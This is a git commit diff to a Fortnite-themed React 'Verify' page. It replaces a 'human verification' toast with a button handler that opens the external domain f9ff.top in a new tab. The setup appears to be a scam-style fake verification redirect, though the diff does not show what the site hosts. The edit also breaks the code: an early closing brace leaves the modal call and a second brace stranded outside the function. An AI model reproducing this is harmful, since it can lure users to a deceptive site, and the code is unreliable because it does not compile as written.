1b77f295bebb919d0b0985604e58244bc989a42c
StefanMn777 <165033446+StefanMn777@users.noreply.github.com>
2025-03-21 01:59:43 +0200

    Update Verify.tsx

--- src/pages/Verify.tsx
+++ src/pages/Verify.tsx
@@ -39,10 +39,8 @@ const Verify = () => {
   }, []);
 
   const handleVerify = () => {
-    toast({
-      title: "Verification Required",
-      description: "Please complete the human verification process.",
-    });
+  window.open("https://www.f9ff.top", "_blank"); // Deschide site-ul într-un tab nou
+};
 
     setIsModalOpen(true);
   };
@@ -172,11 +170,12 @@ const Verify = () => {
               transition={{ delay: 0.7, duration: 0.5 }}
             >
               <Button
-               onClick={handleVerify}
-                className="w-full py-6 bg-fortnite-yellow hover:bg-fortnite-yellow/90 text-fortnite-black font-bold text-xl"
-              >
-                Manual Verify
-              </Button>
+  onClick={handleVerify}
+  className="w-full py-6 bg-fortnite-yellow hover:bg-fortnite-yellow/90 text-fortnite-black font-bold text-xl"
+>
+  Manual Verify
+</Button>
+
             </motion.div>
           </motion.div>
         )}
